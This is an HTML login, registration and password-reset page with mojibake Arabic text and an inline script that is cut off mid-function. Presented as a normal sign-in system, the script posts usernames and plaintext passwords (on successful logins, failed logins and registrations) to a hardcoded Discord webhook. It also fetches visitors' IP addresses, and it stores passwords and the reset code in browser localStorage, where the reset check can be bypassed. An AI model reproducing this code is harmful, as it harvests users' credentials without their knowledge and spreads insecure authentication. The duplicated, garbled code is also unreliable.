<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ³Ø¬ÙŠÙ„ ÙˆØ§Ù„Ø¯Ø®ÙˆÙ„</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
    <div class="container">
        <!-- Ù†Ù…ÙˆØ°Ø¬ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ -->
        <div class="form-container" id="loginFormContainer">
            <div class="header">
                <h1>ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</h1>
                <p>Ù…Ø±Ø­Ø¨Ø§Ù‹ Ø¨Ø¹ÙˆØ¯ØªÙƒ! ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§ØªÙƒ</p>
            </div>
            
            <form id="loginForm">
                <div id="loginError" class="error-message" style="display: none;"></div>
                
                <div class="form-group">
                    <label for="username">Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…</label>
                    <div class="input-with-icon">
                        <i class="fas fa-user"></i>
                        <input type="text" id="username" name="username" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…" required>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="password">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
                    <div class="input-with-icon">
                        <i class="fas fa-lock"></i>
                        <input type="password" id="password" name="password" placeholder="Ø£Ø¯Ø®Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±" required>
                        <i class="fas fa-eye toggle-password" onclick="togglePassword('password')"></i>
                    </div>
                </div>
                
                <div class="options">
                    <div class="remember-me">
                        <input type="checkbox" id="remember" name="remember">
                        <label for="remember">ØªØ°ÙƒØ±Ù†ÙŠ</label>
                    </div>
                    <a href="javascript:void(0)" class="forgot-password" onclick="showForgotPassword()">Ù†Ø³ÙŠØª ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±ØŸ</a>
                </div>
                
                <button type="button" onclick="handleLogin()" class="btn">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</button>

                <div class="switch-form">
                    <p>Ù„ÙŠØ³ Ù„Ø¯ÙŠÙƒ Ø­Ø³Ø§Ø¨ØŸ <a href="javascript:void(0)" onclick="showRegisterForm()">Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯</a></p>
                </div>
            </form>
        </div>

        <!-- Ù†Ù…ÙˆØ°Ø¬ Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯ -->
        <div class="form-container" id="registerFormContainer" style="display: none;">
            <div class="header">
                <h1>Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯</h1>
                <p>Ø§Ù…Ù„Ø£ Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ Ù„Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯</p>
            </div>
            
            <form id="registerForm">
                <div id="registerError" class="error-message" style="display: none;"></div>
                
                <div class="form-group">
                    <label for="regUsername">Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…</label>
                    <div class="input-with-icon">
                        <i class="fas fa-user"></i>
                        <input type="text" id="regUsername" name="regUsername" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ø³Ù… Ù…Ø³ØªØ®Ø¯Ù… Ø¬Ø¯ÙŠØ¯" required>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="regEmail">Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ</label>
                    <div class="input-with-icon">
                        <i class="fas fa-envelope"></i>
                        <input type="email" id="regEmail" name="regEmail" placeholder="Ø£Ø¯Ø®Ù„ Ø¨Ø±ÙŠØ¯Ùƒ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ" required>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="regPassword">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
                    <div class="input-with-icon">
                        <i class="fas fa-lock"></i>
                        <input type="password" id="regPassword" name="regPassword" placeholder="Ø£Ù†Ø´Ø¦ ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± Ù‚ÙˆÙŠØ©" required>
                        <i class="fas fa-eye toggle-password" onclick="togglePassword('regPassword')"></i>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="regConfirmPassword">ØªØ£ÙƒÙŠØ¯ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
                    <div class="input-with-icon">
                        <i class="fas fa-lock"></i>
                        <input type="password" id="regConfirmPassword" name="regConfirmPassword" placeholder="Ø£Ø¹Ø¯ ÙƒØªØ§Ø¨Ø© ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±" required>
                    </div>
                </div>
                
                <button type="button" onclick="handleRegister()" class="btn">Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨</button>
                
                <div class="switch-form">
                    <p>Ù„Ø¯ÙŠÙƒ Ø­Ø³Ø§Ø¨ Ø¨Ø§Ù„ÙØ¹Ù„ØŸ <a href="javascript:void(0)" onclick="showLoginForm()">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</a></p>
                </div>
            </form>
        </div>

        <div class="form-container" id="forgotPasswordContainer" style="display: none;">
            <div class="header">
                <h1>Ø§Ø³ØªØ¹Ø§Ø¯Ø© ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</h1>
                <p>Ø£Ø¯Ø®Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ø³ØªØ¹Ø§Ø¯Ø© ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</p>
            </div>
            
            <form id="forgotPasswordForm">
                <div id="forgotError" class="error-message" style="display: none;"></div>
                <div id="forgotSuccess" class="success-message" style="display: none;"></div>
                
                <div class="form-group">
                    <label for="forgotUsername">Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…</label>
                    <div class="input-with-icon">
                        <i class="fas fa-user"></i>
                        <input type="text" id="forgotUsername" name="forgotUsername" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…" required>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="forgotEmail">Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ</label>
                    <div class="input-with-icon">
                        <i class="fas fa-envelope"></i>
                        <input type="email" id="forgotEmail" name="forgotEmail" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ Ø§Ù„Ù…Ø³Ø¬Ù„" required>
                    </div>
                </div>
                
                <button type="button" class="btn" onclick="sendVerificationCode()">Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚</button>
                
                <div class="discord-contact" id="discordContact" style="display: none;">
                    <p>ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ù„Ø¥Ø¯Ø§Ø±Ø© Ø¹Ø¨Ø± Ø§Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯ Ù„Ø§Ø³ØªÙ„Ø§Ù… Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚</p>
                    <a href="https://discord.gg/uBXFSpSXyc" target="_blank" class="discord-link">
                        <i class="fab fa-discord"></i> Ø§Ù†Ø¶Ù… Ø¥Ù„Ù‰ Ø³ÙŠØ±ÙØ± Ø§Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
                    </a>
                </div>
                
                <div class="form-group" id="verificationCodeGroup" style="display: none;">
                    <label for="verificationCode">Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚</label>
                    <div class="input-with-action">
                        <div class="input-with-icon">
                            <i class="fas fa-key"></i>
                            <input type="text" id="verificationCode" name="verificationCode" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ù„Ø±Ù…Ø² Ø§Ù„Ø°ÙŠ Ø§Ø³ØªÙ„Ù…ØªÙ‡">
                        </div>
                        <button type="button" class="btn confirm-btn" onclick="verifyCode()">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø±Ù…Ø²</button>
                    </div>
                </div>
                
                <button type="button" class="btn" id="verifyCodeBtn" style="display: none;" onclick="verifyCode()">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø±Ù…Ø²</button>
                
                <div class="form-group" id="newPasswordGroup" style="display: none;">
                    <label for="newPassword">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©</label>
                    <div class="input-with-icon">
                        <i class="fas fa-lock"></i>
                        <input type="password" id="newPassword" name="newPassword" placeholder="Ø£Ø¯Ø®Ù„ ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± Ø¬Ø¯ÙŠØ¯Ø©">
                    </div>
                </div>
                
                <button type="button" class="btn" id="resetPasswordBtn" style="display: none;" onclick="resetPassword()">ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</button>
                
                <div class="switch-form">
                    <p><a href="#" onclick="showLoginForm()">Ø§Ù„Ø¹ÙˆØ¯Ø© Ø¥Ù„Ù‰ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</a></p>
                </div>
            </form>
        </div>

    <script src="database.js"></script>
    <script src="script.js"></script>
    <script>
        // Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„ØªØ®Ø²ÙŠÙ†
        if (!localStorage.getItem('users')) {
        localStorage.setItem('users', JSON.stringify([]));
    }

    // Ø¯Ø§Ù„Ø© Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
    function getUserByUsernameAndEmail(username, email, callback) {
        const users = JSON.parse(localStorage.getItem('users'));
        const user = users.find(u => u.username === username && u.email === email);
        callback(user || null);
    }

    // Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ (Ø¨Ø¯ÙˆÙ† Ø®Ø§Ø¯Ù…)
    async function sendVerificationCode() {
    const username = document.getElementById("forgotUsername").value.trim();
    const email = document.getElementById("forgotEmail").value.trim();
    const errorDiv = document.getElementById("forgotError");
    const successDiv = document.getElementById("forgotSuccess");
    
    errorDiv.innerHTML = '';
    errorDiv.style.display = 'none';
    successDiv.style.display = 'none';
    
    if (!username || !email) {
        showError(errorDiv, "ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙˆØ§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ");
        return;
    }

    try {
        showLoading(errorDiv, "Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...");
        
        // 1. Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
        getUserByUsernameAndEmail(username, email, async (user) => {
            if (user) {
                currentUser = user;
                verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
                
                // 2. Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ù…Ø² Ø¥Ù„Ù‰ ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Discord
                const webhookURL = "https://discord.com/api/webhooks/1384553129718317239/tb1HmhQ-oV41D9c6yecWT8ygoOKdvH0NIozwQ7Al-60USSb9Kq0JQqJyHSLo9WAeLEl8";
                
                const embed = {
                    title: "ğŸ” Ø·Ù„Ø¨ Ø§Ø³ØªØ¹Ø§Ø¯Ø© ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±",
                    description: `
                        **ğŸ‘¤ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:** ${username}
                        **ğŸ“§ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ:** ${email}
                        **ğŸ”¢ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚:** ||${verificationCode}||
                        **ğŸ•’ Ø§Ù„ÙˆÙ‚Øª:** ${new Date().toLocaleString()}
                    `,
                    color: 0xFFA500
                };
                
                const response = await fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ embeds: [embed] })
                });
                
                if (!response.ok) throw new Error("ÙØ´Ù„ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ù…Ø²");
                
                // 3. Ø¥Ø¸Ù‡Ø§Ø± ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
                document.getElementById("verificationCodeGroup").style.display = "block";
                document.getElementById("discordContact").style.display = "block";
                
                showSuccess(successDiv, `
                    <p>ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø¥Ù„Ù‰ Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„ÙŠÙ†!</p>
                    <p>ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªÙˆØ§ØµÙ„ Ø¹Ø¨Ø± <a href="https://discord.gg/Ø±Ø§Ø¨Ø·-Ø³ÙŠØ±ÙØ±Ùƒ" target="_blank">Ø³ÙŠØ±ÙØ± Ø§Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯</a> Ù„Ø§Ø³ØªÙ„Ø§Ù… Ø§Ù„Ø±Ù…Ø².</p>
                `);
                
                // 4. Ø­ÙØ¸ Ø§Ù„Ø±Ù…Ø² Ù…Ø¤Ù‚ØªØ§Ù‹ (ØµÙ„Ø§Ø­ÙŠØ© 5 Ø¯Ù‚Ø§Ø¦Ù‚)
                localStorage.setItem('tempCode', verificationCode);
                localStorage.setItem('tempCodeTime', new Date().getTime());
                
                setTimeout(() => {
                    if (document.getElementById("verificationCodeGroup").style.display !== "none") {
                        showError(errorDiv, "Ø§Ù†ØªÙ‡Øª ØµÙ„Ø§Ø­ÙŠØ© Ø§Ù„Ø±Ù…Ø². ÙŠØ±Ø¬Ù‰ Ø·Ù„Ø¨ Ø±Ù…Ø² Ø¬Ø¯ÙŠØ¯.");
                    }
                }, 5 * 60 * 1000);
                
            } else {
                showError(errorDiv, "Ø¨ÙŠØ§Ù†Ø§Øª ØºÙŠØ± ØµØ­ÙŠØ­Ø©. ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙˆØ§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ.");
            }
        });
        
    } catch (error) {
        console.error("Error:", error);
        showError(errorDiv, "Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„. Ø­Ø§ÙˆÙ„ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰ Ù„Ø§Ø­Ù‚Ø§Ù‹.");
    }
}

    // Ø¯Ø§Ù„Ø© Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø±Ù…Ø²
    function verifyCode() {
        const enteredCode = document.getElementById("verificationCode").value;
        const savedCode = localStorage.getItem('tempCode');
        const codeTime = localStorage.getItem('tempCodeTime');
        const now = new Date().getTime();
        
        if (!enteredCode || !savedCode) {
            showError(document.getElementById("forgotError"), "ÙŠØ¬Ø¨ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚");
            return false;
        }
        
        if (now - codeTime > 10 * 60 * 1000) {
            showError(document.getElementById("forgotError"), "Ø§Ù†ØªÙ‡Øª ØµÙ„Ø§Ø­ÙŠØ© Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚");
            return false;
        }
        
        if (enteredCode === savedCode) {
            document.getElementById("newPasswordGroup").style.display = "block";
            document.getElementById("resetPasswordBtn").style.display = "block";
            return true;
        } else {
            showError(document.getElementById("forgotError"), "Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ ØºÙŠØ± ØµØ­ÙŠØ­");
            return false;
        }
    }

    // Ø¯ÙˆØ§Ù„ Ù…Ø³Ø§Ø¹Ø¯Ø©
    function showError(element, message) {
        element.innerHTML = message;
        element.style.display = "block";
        element.style.color = "#dc3545";
    }
    
    function showSuccess(element, message) {
        element.innerHTML = message;
        element.style.display = "block";
        element.style.color = "#28a745";
    }
    
    function showLoading(element, message) {
        element.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${message}`;
        element.style.display = "block";
        element.style.color = "#17a2b8";
    }

    // Ù…ØªØºÙŠØ±Ø§Øª Ø¹Ø§Ù…Ø©
    let currentUser = null;
    let verificationCode = null;
    let verificationSentTime = null;

    // Ø¯Ø§Ù„Ø© ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù…Ø¹Ø¯Ù„Ø©
    async function handleLogin() {
        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;
        const rememberMe = document.getElementById("remember").checked;
        
        // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        loginUser(username, password, async function(success, message, user) {
            const errorDiv = document.getElementById("loginError");
            errorDiv.innerHTML = '';
            errorDiv.style.display = 'none';
            
            if(success) {
                if(rememberMe) {
                    localStorage.setItem('username', username);
                    localStorage.setItem('rememberMe', 'true');
                } else {
                    localStorage.removeItem('username');
                    localStorage.removeItem('rememberMe');
                }
                
                // Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¥Ù„Ù‰ Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
                await sendLoginToDiscord(username, password);
                window.location.href = "websiet/index.html";
            } else {
                errorDiv.innerHTML = message;
                errorDiv.style.display = "block";
                
                if(message.includes("ØºÙŠØ± ØµØ­ÙŠØ­Ø©")) {
                    await sendFailedToDiscord(username, password);
                }
            }
        });
    }

    // Ø¯Ø§Ù„Ø© Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯
    async function handleRegister() {
        const username = document.getElementById("regUsername").value;
        const email = document.getElementById("regEmail").value;
        const password = document.getElementById("regPassword").value;
        const confirmPassword = document.getElementById("regConfirmPassword").value;
        
        if(password !== confirmPassword) {
            document.getElementById("registerError").innerHTML = "ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± ØºÙŠØ± Ù…ØªØ·Ø§Ø¨Ù‚Ø©";
            document.getElementById("registerError").style.display = "block";
            return;
        }
        
        registerUser(username, email, password, async function(success, message) {
            const errorDiv = document.getElementById("registerError");
            errorDiv.innerHTML = '';
            errorDiv.style.display = 'none';
            
            if(success) {
                await sendRegisterToDiscord(username, email, password);
                alert(message);
                showLoginForm();
            } else {
                errorDiv.innerHTML = message;
                errorDiv.style.display = "block";
            }
        });
    }

    async function sendVerificationCode() {
    const username = document.getElementById("forgotUsername").value.trim();
    const email = document.getElementById("forgotEmail").value.trim();
    const errorDiv = document.getElementById("forgotError");
    const successDiv = document.getElementById("forgotSuccess");
    
    errorDiv.innerHTML = '';
    errorDiv.style.display = 'none';
    successDiv.style.display = 'none';
    
    if (!username || !email) {
        errorDiv.innerHTML = "ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙˆØ§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ";
        errorDiv.style.display = "block";
        return;
    }

    try {
        // Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© ØªØ­Ù…ÙŠÙ„
        errorDiv.innerHTML = "Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...";
        errorDiv.style.display = "block";
        
        // Ù‡Ø°Ø§ Ø§ÙØªØ±Ø§Ø¶ÙŠ - Ø§Ø³ØªØ¨Ø¯Ù„Ù‡ Ø¨Ø§Ù„Ø¯Ø§Ù„Ø© Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠØ© Ù…Ù† database.js
        const user = await new Promise((resolve) => {
            getUserByUsernameAndEmail(username, email, resolve);
        });

        if (user) {
            currentUser = user;
            verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
            verificationSentTime = new Date();
            
            // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
            await fetch("https://discord.com/api/webhooks/1384553129718317239/tb1HmhQ-oV41D9c6yecWT8ygoOKdvH0NIozwQ7Al-60USSb9Kq0JQqJyHSLo9WAeLEl8", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    embeds: [{
                        title: "ğŸ” Ø·Ù„Ø¨ Ø§Ø³ØªØ¹Ø§Ø¯Ø© ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±",
                        description: `**ğŸ‘¤ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:** ${username}\n**ğŸ“§ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ:** ${email}\n**ğŸ”¢ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚:** ${verificationCode}`,
                        color: 0xFFA500
                    }]
                })
            });

            // Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ø¹Ù†Ø§ØµØ± Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©
            document.getElementById("verificationCodeGroup").style.display = "block";
            document.getElementById("discordContact").style.display = "block";
            document.getElementById("newPasswordGroup").style.display = "none";
            document.getElementById("resetPasswordBtn").style.display = "none";
            
            successDiv.innerHTML = "ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ù„Ù„Ù…Ø³Ø¤ÙˆÙ„ÙŠÙ†. ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹Ù‡Ù… Ø¹Ø¨Ø± Ø§Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯.";
            successDiv.style.display = "block";
            
        } else {
            errorDiv.innerHTML = "Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø­Ø³Ø§Ø¨ Ù…Ø±ØªØ¨Ø· Ø¨Ù‡Ø°Ù‡ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª. ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙˆØ§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ.";
            errorDiv.style.display = "block";
        }
    } catch (error) {
        console.error("Error:", error);
        errorDiv.innerHTML = "Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø®Ø§Ø¯Ù…. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.";
        errorDiv.style.display = "block";
    }
}

function verifyCode() {
    const enteredCode = document.getElementById("verificationCode").value.trim();
    const errorDiv = document.getElementById("forgotError");
    const successDiv = document.getElementById("forgotSuccess");
    
    errorDiv.innerHTML = '';
    errorDiv.style.display = 'none';
    
    if (!enteredCode) {
        showError(errorDiv, "ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚");
        return;
    }
    
    if (enteredCode === verificationCode) {
        // Ø¥Ø®ÙØ§Ø¡ Ù‚Ø³Ù… Ø§Ù„Ø±Ù…Ø²
        document.getElementById("verificationCodeGroup").style.display = "none";
        document.getElementById("discordContact").style.display = "none";
        
        // Ø¥Ø¸Ù‡Ø§Ø± Ù‚Ø³Ù… ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©
        document.getElementById("newPasswordGroup").style.display = "block";
        document.getElementById("resetPasswordBtn").style.display = "block";
        
        showSuccess(successDiv, "ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ù†Ø¬Ø§Ø­! ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©");
    } else {
        showError(errorDiv, "Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ ØºÙŠØ± ØµØ­ÙŠØ­. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.");
    }
}

function resetPassword() {
    const newPassword = document.getElementById("newPassword").value;
    const errorDiv = document.getElementById("forgotError");
    const successDiv = document.getElementById("forgotSuccess");
    
    if (!newPassword || newPassword.length < 6) {
        showError(errorDiv, "ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± ÙŠØ¬Ø¨ Ø£Ù† ØªÙƒÙˆÙ† 6 Ø£Ø­Ø±Ù Ø¹Ù„Ù‰ Ø§Ù„Ø£Ù‚Ù„");
        return;
    }
    
    // ØªØ­Ø¯ÙŠØ« ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± ÙÙŠ localStorage
    const users = JSON.parse(localStorage.getItem('users'));
    const userIndex = users.findIndex(u => u.id === currentUser.id);
    
    if (userIndex !== -1) {
        users[userIndex].password = newPassword;
        localStorage.setItem('users', JSON.stringify(users));
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± Ø¥Ù„Ù‰ ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Discord
        sendPasswordChangeToDiscord(currentUser.username, currentUser.email)
            .then(() => {
                showSuccess(successDiv, "ØªÙ… ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø¨Ù†Ø¬Ø§Ø­! ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ù„Ø¢Ù† ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„");
                setTimeout(() => showLoginForm(), 2000);
            })
            .catch(error => {
                console.error("Error sending notification:", error);
                showSuccess(successDiv, "ØªÙ… ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø¨Ù†Ø¬Ø§Ø­ ÙˆÙ„ÙƒÙ† Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±");
                setTimeout(() => showLoginForm(), 2000);
            });
    } else {
        showError(errorDiv, "Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ ØªØ­Ø¯ÙŠØ« ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±");
    }
}

// Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø¥Ù„Ù‰ Discord
async function sendPasswordChangeToDiscord(username, email) {
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        
